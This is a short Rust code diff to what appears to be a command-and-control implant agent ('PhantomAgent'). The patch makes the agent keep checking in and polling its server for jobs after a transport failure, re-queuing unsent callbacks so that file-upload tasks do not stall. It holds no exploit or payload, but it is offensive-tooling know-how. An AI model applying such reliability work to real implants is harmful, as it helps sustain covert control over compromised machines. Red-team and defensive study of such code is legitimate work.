@@ -174,6 +174,13 @@ impl PhantomAgent {
     }
 
     /// Flush pending callbacks over ECDH (one session packet; one `DemonMessage` for the batch).
+    ///
+    /// On **transport** failure the callbacks are restored and `Ok` is returned so
+    /// [`Self::ecdh_checkin`] can still send `[CommandCheckin, CommandGetJob]` in the same
+    /// cycle. Returning `Err` here would suppress job polling indefinitely while the queue is
+    /// non-empty, which strands multi-part tasks such as upload MemFile chunks + `CommandFs`.
+    ///
+    /// Callback encoding failures still propagate: they are not recoverable by retrying send.
     async fn ecdh_flush_pending_callbacks(&mut self) -> Result<(), PhantomError> {
         let callbacks = self.state.drain_callbacks();
         if callbacks.is_empty() {
@@ -190,7 +197,6 @@ impl PhantomAgent {
         if let Err(e) = self.ecdh_send_packages(pkgs).await {
             warn!(error = %e, "ecdh: failed to flush pending callbacks; re-queuing callbacks");
             self.state.requeue_callbacks_front(recovery);
-            return Err(e);
         }
         Ok(())
     }
